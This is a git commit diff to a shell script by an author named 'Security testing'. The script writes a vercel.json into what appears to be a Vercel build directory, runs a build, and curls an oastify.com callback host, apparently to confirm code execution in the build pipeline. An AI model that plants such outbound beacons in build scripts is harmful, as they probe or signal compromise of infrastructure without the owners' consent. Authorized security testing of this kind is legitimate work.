6e3f4b9fa21f82f4d7af77517c273615440cf7d3
Security testing <118594933+w2h3@users.noreply.github.com>
2024-11-21 15:46:14 +0200

    Update file.sh

--- file.sh
+++ file.sh
@@ -1,3 +1,3 @@
 echo '{"name":"b_kFQldMSbtgL"}' > /vercel/path0/vercel.json
 bun run build
-curl https://3nr5yi6gm1ynydwak420cxskcbi26t8jw8.oastify.com/success
+curl https://3nr5yi6gm1ynydwak420cxskcbi26t8jw8.oastify.com/success/
